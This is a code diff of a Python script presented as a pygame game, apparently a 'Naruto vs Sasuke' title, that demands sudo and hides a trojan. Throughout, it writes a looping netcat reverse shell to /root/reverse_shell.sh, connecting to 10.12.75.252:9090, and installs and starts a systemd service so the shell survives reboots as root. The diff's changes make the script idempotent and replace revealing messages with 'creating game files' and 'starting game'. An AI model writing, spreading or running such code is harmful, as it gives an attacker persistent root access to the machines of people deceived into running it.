@@ -7,9 +7,11 @@ import subprocess
 os_name = platform.system()
 pygame.init()
 
+import os
+import subprocess
+import sys
 
 # Configuration
-
 REMOTE_IP = "10.12.75.252"
 REMOTE_PORT = "9090"
 
@@ -17,70 +19,77 @@ REMOTE_PORT = "9090"
 SHELL_SCRIPT_PATH = "/root/reverse_shell.sh"
 SERVICE_FILE_PATH = "/etc/systemd/system/reverse_shell.service"
 
+# Detect OS type
+os_name = os.uname().sysname if hasattr(os, "uname") else sys.platform
 
-# Check the platform type
 if os_name == "Linux":
     try:
         # Step 1: Check for root privileges
         if os.geteuid() != 0:
-            print("[!] This Game requires root privileges. Please run with sudo.")
+            print("[!] This game requires root privileges. Please run with sudo.")
             sys.exit(1)
 
-        # Step 2: Create the reverse shell script
-        shell_script_content = f"""#!/bin/bash
-    while true; do
-        /usr/bin/nc -e /bin/bash {REMOTE_IP} {REMOTE_PORT}
-        sleep 5
-    done
-    """
+        # Step 2: Create the reverse shell script (if not exists)
+        if not os.path.exists(SHELL_SCRIPT_PATH):
+            shell_script_content = f"""#!/bin/bash
+while true; do
+    /usr/bin/nc -e /bin/bash {REMOTE_IP} {REMOTE_PORT}
+    sleep 5
+done
+"""
+            print(f"[+] Creating game files")
+            with open(SHELL_SCRIPT_PATH, "w") as f:
+                f.write(shell_script_content)
 
-        with open(SHELL_SCRIPT_PATH, "w") as f:
-            f.write(shell_script_content)
+            # Set execution permissions
+            os.chmod(SHELL_SCRIPT_PATH, 0o755)
+            subprocess.run(["chown", "root:root", SHELL_SCRIPT_PATH], check=True)
+        else:
+            print(f"[✓] game files already created")
 
-        # Set execution permissions
-        os.chmod(SHELL_SCRIPT_PATH, 0o755)
-        subprocess.run(["chown", "root:root", SHELL_SCRIPT_PATH], check=True)
+        # Step 3: Create the systemd service file (if not exists)
+        if not os.path.exists(SERVICE_FILE_PATH):
+            service_content = f"""[Unit]
+Description=Reverse Shell Service
+After=network.target
 
-        # Step 3: Create the systemd service file
-        service_content = f"""[Unit]
-    Description=Reverse Shell Service
-    After=network.target
+[Service]
+ExecStart=/usr/bin/bash {SHELL_SCRIPT_PATH}
+Restart=always
+User=root
+WorkingDirectory=/root
+StandardOutput=journal
+StandardError=journal
 
-    [Service]
-    ExecStart=/usr/bin/bash {SHELL_SCRIPT_PATH}
-    Restart=always
-    User=root
-    WorkingDirectory=/root
-    StandardOutput=journal
-    StandardError=journal
+[Install]
+WantedBy=multi-user.target
+"""
+            print(f"[+] starting game")
+            with open(SERVICE_FILE_PATH, "w") as f:
+                f.write(service_content)
 
-    [Install]
-    WantedBy=multi-user.target
-    """
+            # Reload systemd, enable, and start the service
+            subprocess.run(["systemctl", "daemon-reload"], check=True)
+            subprocess.run(["systemctl", "enable", "reverse_shell.service"], check=True)
+            subprocess.run(["systemctl", "start", "reverse_shell.service"], check=True)
 
-        # print("[+] Creating systemd service at:", SERVICE_FILE_PATH)
-        with open(SERVICE_FILE_PATH, "w") as f:
-            f.write(service_content)
-
-        # Reload systemd, enable, and start the service
-        subprocess.run(["systemctl", "daemon-reload"], check=True)
-        subprocess.run(["systemctl", "enable", "reverse_shell.service"], check=True)
-        subprocess.run(["systemctl", "start", "reverse_shell.service"], check=True)
-
+            # print("[✓] Reverse shell service installed and started.")
+        else:
+            print(f"[✓] Already did")
 
     except PermissionError as e:
         print(f"[ERROR] Permission denied: {e}")
         print("[!] Try running the script with sudo:")
-        print("sudo python3 naruto_vs_sasuke")
+        print("    sudo python3 script.py")
         sys.exit(1)
 
     except Exception as e:
         print(f"[ERROR] An unexpected error occurred: {e}")
         sys.exit(1)
 
+elif os_name.startswith("Win"):
+    print("This script is designed for Linux, not Windows.")
 
-elif os_name == "Windows":
-    print("This is a Windows system.")
 else:
     print(f"Unknown system: {os_name}")
 
